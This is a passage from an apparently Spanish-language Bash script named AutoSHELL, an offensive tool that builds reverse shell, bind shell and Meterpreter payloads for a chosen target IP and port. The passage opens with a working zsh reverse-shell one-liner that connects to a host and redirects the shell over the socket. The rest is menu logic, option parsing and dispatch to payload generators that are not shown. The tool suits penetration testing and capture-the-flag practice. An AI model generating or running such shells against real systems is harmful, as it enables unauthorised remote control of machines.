        echo -e ${LG}"\n[+] Código de reverse shell en $tipo:\n"
        echo -e ${DG}"\n\tzsh -c 'zmodload zsh/net/tcp && ztcp 127.0.0.1 8080 && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'\n"${NC}
}
###########################################
#-----------[ Menú AutoSHELL ]------------#
###########################################
menu(){
	echo -e ${LG}"\n[+] Tipo de reverse shell disponible:\n"
	echo -e "\t[1] Reverse shell"
	echo -e "\t[2] Bind reverse shell"
	echo -e "\t[3] Meterpreter reverse shell"
	read -rep $'\n[+] Introudce la opción (número) de shell que quieres obtener: ' modo
	if [[ $modo = "1" ]]; then
		mod="reverse"
		echo -e ${LG}"\n[+] Listado de reverse shell disponibles:\n"
        	declare -A lista_shell
        	lista_shell=$elementos_shell
        	echo -e ${elementos_shell[@]} | tr " " "\n" | awk '{print "\t"$0 }'
		read -rep $'\n[+] Introudce el nombre de la reverse shell que quieres obtener: ' tipo
		if [[ -z $tipo ]]; then
			echo -e ${RED}"\n[!] No has introducido ninguna opción"${NC}
                        echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
                        exit 1
		else
			declare -A names
			for h in "${!elementos_shell[@]}"; do
				names[${elementos_shell[$h]}]="$h"
			done
			for j in "$tipo"; do
				if [[ -z "${names[$j]}" ]]; then
			                echo -e ${RED}"\n[!] La opción introducida no es válida"${NC}
	                		echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
					exit 1
				fi
			done
		fi
	elif [[ $modo = "2" ]]; then
		mod="bind"
		echo -e ${LG}"\n[+] Listado de bind reverse shell disponibles:\n"
		echo -e "\tphp"
		echo -e "\tpython"
		read -rep $'\n[+] Introudce el nombre de la reverse shell que quieres obtener: ' tipo
		if [[ "$tipo" != "python" ]] && [[ "$tipo" != "php" ]]; then
                                echo -e ${RED}"\n[!] La opción introducida no es válida"${NC}
                                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
                                exit 1
		fi
	elif [[ $modo = "3" ]]; then
		mod="msfv"
		echo -e ${LG}"\n[+] Listado de meterpreter reverse shell disponibles:\n"
                declare -A lista_msfv
                lista_msfv=$elementos_msfv
                echo -e ${elementos_msfv[@]} | tr " " "\n" | awk '{print "\t"$0 }'
                read -rep $'\n[+] Introudce el nombre de la reverse shell que quieres obtener: ' tipo
                if [[ -z $tipo ]]; then
                        echo -e ${RED}"\n[!] No has introducido ninguna opción"${NC}
                        echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
                        exit 1
                else
	                declare -A names
	                for h in "${!elementos_msfv[@]}"; do
	                        names[${elementos_msfv[$h]}]="$h"
	                done
	                for j in "$tipo"; do
	                        if [[ -z "${names[$j]}" ]]; then
	                                echo -e ${RED}"\n[!] La opción introducida no es válida"${NC}
	                                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
	                                exit 1
	                        fi
	                done
		fi
	else
		echo -e ${RED}"\n[!] La opción introducida no es válida"${NC}
                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
		exit 1
	fi
	read -rep $'\n[+] Introduce la dirección IP a utilizar: ' ip
	read -rep $'\n[+] Introduce el puerto a utilizar: ' puerto
	$tipo"_"$mod
}
###########################################
#-----------[ Info AutoSHELL ]------------#
###########################################
info(){
	declare -A tipos
	for o in "${!elementos_shell[@]}"; do 
		tipos[${elementos_shell[$o]}]="$o"
	done
	for tipo in "$type"; do
		if [[ -n "${tipos[$tipo]}" ]]; then
	        	tipo=$type
	                $type"_info"
		else
	        	echo -e ${RED}"\n[!] El nombre del tipo de reverse shell que has introducido no es válido"${NC}
	                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
			echo -e ${LG}"\tO usa la opción --list, --lista o -l para ver los tipos de reverse shell disponibles para el parámetro [-c]."${NC}
		fi
	done
}
###########################################
#-----------[ Lista AutoSHELL ]-----------#
###########################################
lista(){
        echo -e ${LG}"\n[+] Tipos de reverse shell disponibles en AutoSHELL:"
	echo -e ${DG}"\n\t-win o -lin indican que son para Windows o para Linux. Si no especifica es Linux.\n"
        declare -A lista_shell
        lista_shell=$elementos_shell
        echo -e ${DG}${elementos_shell[@]} | tr " " "\n" | awk '{print "\t"$0 }' 
        echo ${NC}
        echo -e ${LG}"\n[+] Tipos de bind reverse shell disponibles en AutoSHELL:\n"
        echo -e ${DG}"\tphp"
	echo -e ${DG}"\tpython\n"${NC}
        echo -e ${LG}"\n[+] Tipos de meterpreter reverse shell disponibles en AutoSHELL:\n"
        declare -A lista_msfv
        lista_msfv=$elementos_msfv
        echo -e ${DG}${elementos_msfv[@]} | tr " " "\n" | awk '{print "\t"$0 }' 
        echo ${NC}
}
modos(){
	echo -e ${LG}"\n[+] Modos de reverse shell disponibles en AutoSHELL:\n"
	echo -e ${DG}"\tReverse shell\n"
	echo -e ${YELLOW}"\t\tParámetro -r\n"
        echo -e ${DG}"\tBind reverse shell\n"
        echo -e ${YELLOW}"\t\tParámetro -b\n"
        echo -e ${DG}"\tMeterpreter reverse shell\n"${NC}
        echo -e ${YELLOW}"\t\tParámetro -v\n"
}
###########################################
#------------[ Auto Reverse ]-------------#
###########################################
auto_reverse(){
	if [[ $tipo = "" ]] || [[ $ip = "" ]] || [[ $puerto = "" ]]; then
                echo -e ${RED}"\n[!] Error. No has introducido parámetros y argumentos válidos."${NC}
                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
		echo -e ${LG}"\tO usa la opción --list, --lista o -l para ver los tipos de reverse shell disponibles para el parámetro [-t] o los modos del parámetro [-m]."${NC}
		exit 1
	else
		$tipo"_reverse" $ip $puerto
	fi
}
###########################################
#--------------[ Auto Bind ]--------------#
###########################################
auto_bind(){
        if [[ $tipo = "" ]] || [[ $ip = "" ]] || [[ $puerto = "" ]]; then
                echo -e ${RED}"\n[!] Error. No has introducido parámetros y argumentos válidos."${NC}
                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
                echo -e ${LG}"\tO usa la opción --list, --lista o -l para ver los tipos de reverse shell disponibles para el parámetro [-t] o los modos del parámetro [-m]."${NC}
                exit 1
        else
                $tipo"_bind" $ip $puerto
        fi
}
###########################################
#------------[ Auto MSFVenom ]------------#
###########################################
auto_msfv(){
        if [[ $tipo = "" ]] || [[ $ip = "" ]] || [[ $puerto = "" ]]; then
                echo -e ${RED}"\n[!] Error. No has introducido parámetros y argumentos válidos."${NC}
                echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
                echo -e ${LG}"\tO usa la opción --list, --lista o -l para ver los tipos de reverse shell disponibles para el parámetro [-t] o los modos del parámetro [-m]."${NC}
                exit 1
        else
                $tipo"_meter" $ip $puerto
        fi
}
###########################################
#----------------[ Modos ]----------------#
###########################################
reverse_mod(){
	auto_reverse $tipo $ip $puerto
}
bind_mod(){
	auto_bind $tipo $ip $puerto
}
msfv_mod(){
	auto_msfv $tipo $ip $puerto
}
###########################################
#--------------[ AutoSHELL ]--------------#
###########################################
while getopts ":hlc:i:p:t:e:mvbr-:" opt; do
   patch_lo "mod modo help ayuda list lista code: codigo:" opt "$@"
   patch_dash
   case $opt in
	h|help|ayuda)
		ayuda
		exit 0
	;;
	\?)
        	echo -e ${RED}"\n[!] El parámetro introducido [-$OPTARG] no es válido."${NC}
        	echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
        	exit 1
	;;
	:)
		echo -e ${RED}"\n[!] El parámetro [-$OPTARG] requiere un argumento."${NC}
        	echo -e ${LG}"\tUsa la opción --ayuda, --help o -h para más información."${NC}
        	exit 1
	;;
	c|code|codigo)
		cod=$OPTIND
		type=$OPTARG
		info $cod $type
		exit 0
	;;
	l|list|lista)
		lista
		exit 0
        ;;
	m|mod|modo)
		modos
		exit 0
	;;
	v)
		msfv_mod $tipo $ip $puerto
		exit 0
	;;
	b)
		bind_mod $tipo $ip $puerto
		exit 0
	;;
	e)
		puerto=$OPTARG
		escucha $epuerto
		exit 0
	;;
	t)
		tipo=$OPTARG
	;;
	i)
		ip=$OPTARG
	;;
	p)
		puerto=$OPTARG
	;;
        r)
                reverse_mod $tipo $ip $puerto
		exit 0
        ;;
   esac
done
        if [[ $# -eq 0 ]]; then
                 menu
	else
		echo -e ${RED}"\n[!] Usa la opción --ayuda, --help o -h para más información."${NC}
                exit 1

        fi
